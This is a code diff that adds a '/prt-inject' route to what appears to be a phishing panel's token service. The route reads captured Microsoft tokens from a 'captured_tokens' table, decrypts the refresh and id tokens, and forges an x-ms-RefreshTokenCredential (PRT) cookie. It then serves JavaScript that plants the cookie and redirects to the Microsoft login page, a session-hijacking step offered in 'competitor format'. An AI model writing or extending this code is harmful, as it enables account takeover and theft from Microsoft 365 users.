@@ -691,6 +691,82 @@ router.get('/inject-script', userAuth, async (req, res) => {
   }
 });
 
+// ─── PRT-only cookie injection script (exact competitor format) ──────
+router.get('/prt-inject', userAuth, async (req, res) => {
+  try {
+    const { token_id } = req.query;
+    if (!token_id) {
+      return res.status(400).json({ error: 'token_id is required' });
+    }
+
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [token_id, req.user.id]
+    );
+    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
+
+    const token = tokens[0];
+    const refreshToken = decrypt(token.refresh_token_encrypted);
+    const idToken = decrypt(token.id_token_encrypted);
+
+    if (!refreshToken) {
+      return res.status(400).json({ error: 'No refresh token available' });
+    }
+
+    // Extract tid and uid for PRT construction
+    let tid = token.tenant || 'common';
+    let uid = '';
+
+    // Try to get uid from session_key_jwe or client_info
+    const sessionKeyJwe = decrypt(token.session_key_jwe);
+    if (sessionKeyJwe) {
+      try {
+        const parsed = JSON.parse(sessionKeyJwe);
+        if (parsed.client_info) {
+          const decoded = Buffer.from(parsed.client_info, 'base64').toString();
+          const info = JSON.parse(decoded);
+          uid = info.uid || '';
+        }
+      } catch (e) { /* ignore */ }
+    }
+
+    // Try to get tid from id_token
+    if (idToken) {
+      try {
+        const payload = idToken.split('.')[1];
+        let padded = payload;
+        while (padded.length % 4) padded += '=';
+        const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
+        tid = decoded.tid || tid;
+      } catch (e) { /* ignore */ }
+    }
+
+    // Generate PRT cookie using cookie converter
+    const cookieConverter = require('../services/cookieconverter');
+    const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
+      refreshToken,
+      token.account_type || 'work_school',
+      { tid: tid, uid: uid, scopes: 'openid profile email offline_access User.Read' }
+    );
+
+    if (!prtCookieObj || !prtCookieObj.value) {
+      return res.status(400).json({ error: 'Failed to generate PRT cookie' });
+    }
+
+    // Generate exact competitor format script
+    const script = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";
+// Redirect after 3s
+setTimeout(() => {
+  window.location.href = "https://login.microsoftonline.com/?auth=2";
+}, 3000);`;
+
+    res.type('application/javascript').send(script);
+  } catch (err) {
+    console.error('[Tokens] PRT inject error:', err);
+    res.status(500).json({ error: 'Failed to generate PRT injection script' });
+  }
+});
+
 // ─── Manual cookie conversion from pasted access token ──────────────
 router.post('/convert-cookie', userAuth, async (req, res) => {
   try {
